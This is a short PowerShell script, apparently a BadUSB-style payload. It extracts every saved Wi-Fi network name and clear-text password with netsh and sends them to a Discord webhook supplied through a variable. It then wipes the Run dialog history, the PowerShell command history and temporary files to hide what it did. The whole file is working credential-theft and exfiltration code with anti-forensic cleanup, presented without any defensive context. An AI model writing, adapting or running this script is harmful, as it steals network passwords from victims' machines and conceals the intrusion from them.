$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ WIFI_NAME=$name;PASSWORD=$pass }} | Out-String

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$True)]
        [string]$webhook_url,
        [parameter(Position=1,Mandatory=$True)]
        [string]$message 
    )

    $Body = @{
        'content' = $message
    }

    Invoke-RestMethod -Uri $webhook_url -Method POST -Body ($Body | ConvertTo-Json) -ContentType 'application/json'
}

if (-not ([string]::IsNullOrEmpty($wifiProfiles)) -and -not ([string]::IsNullOrEmpty($dc))){
    Upload-Discord -webhook_url $dc -message $wifiProfiles
}

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Remove-Item $env:TEMP/wifi-pass.txt -Force -ErrorAction SilentlyContinue
Remove-Item -Path $HOME\RecycleBin\wifi-pass.txt -Force
